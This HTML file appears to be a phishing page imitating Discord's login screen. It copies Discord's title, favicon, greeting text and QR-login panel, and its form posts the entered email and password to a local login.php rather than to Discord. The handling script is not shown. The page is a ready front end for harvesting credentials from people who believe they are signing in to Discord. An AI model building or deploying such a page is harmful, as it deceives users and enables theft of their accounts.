<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" href="https://discord.com/assets/07dca80a102d4149e973.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-card">
        <div class="login-form-side">
            <div class="login-header">
                <h1>Welcome back!</h1>
                <p>We're so excited to see you again!</p>
            </div>
            <form action="login.php" method="POST">
                <div>
                    <label>Email or Phone Number</label>
                    <input type="text" name="email" required autofocus>
                </div>
                <div>
                    <label>Password</label>
                    <input type="password" name="pass" required>
                    <a href="#" class="forgot-link">Forgot your password?</a>
                </div>
                <button type="submit" class="login-btn">Log In</button>
                <div class="register-text">
                    Need an account? <a href="#">Register</a>
                </div>
            </form>
        </div>
        <div class="qr-side">
            <div class="qr-container">
                <img src="qr.png" alt="QR Code">
            </div>
            <h2 style="font-size: 24px; margin-bottom: 8px;">Log in with QR Code</h2>
            <p style="color: var(--discord-secondary); text-align: center; font-size: 16px;">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
        </div>
    </div>
</body>
</html>
